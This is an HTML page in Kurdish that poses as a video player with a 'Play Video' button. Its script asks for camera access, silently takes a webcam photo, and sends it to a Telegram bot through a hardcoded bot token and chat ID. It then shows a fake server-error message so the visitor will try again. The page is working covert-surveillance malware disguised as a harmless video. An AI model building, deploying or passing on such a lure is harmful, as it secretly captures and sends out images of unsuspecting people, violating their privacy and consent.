<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* باگراوەندی مافوری کلاسیک - ڕەنگی زەیتوونی و سوور */
            background: #1a0f0a url('https://www.transparenttextures.com/patterns/aged-paper.png');
            background-color: #2e3b23;
            position: relative;
            overflow: hidden;
            font-family: sans-serif;
        }

        /* دروستکردنی شێوەی مافور لە باگراوند */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(45deg, rgba(165, 42, 42, 0.1) 0px, rgba(165, 42, 42, 0.1) 2px, transparent 2px, transparent 10px);
            z-index: -1;
        }

        #main-container {
            background: rgba(40, 40, 40, 0.95);
            padding: 40px 20px;
            border-radius: 10px;
            border: 3px double #d4af37; /* لێواری زێڕینی کلاسیک */
            box-shadow: 0 0 50px rgba(0,0,0,0.9);
            text-align: center;
            width: 85%;
            max-width: 320px;
            z-index: 10;
        }

        h2 {
            color: #d4af37;
            margin-bottom: 25px;
            font-size: 18px;
            text-shadow: 1px 1px 2px #000;
        }

        #startBtn {
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #d4af37;
            background: #fdfdfd;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 0 #b8860b;
        }

        #startBtn:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #b8860b;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
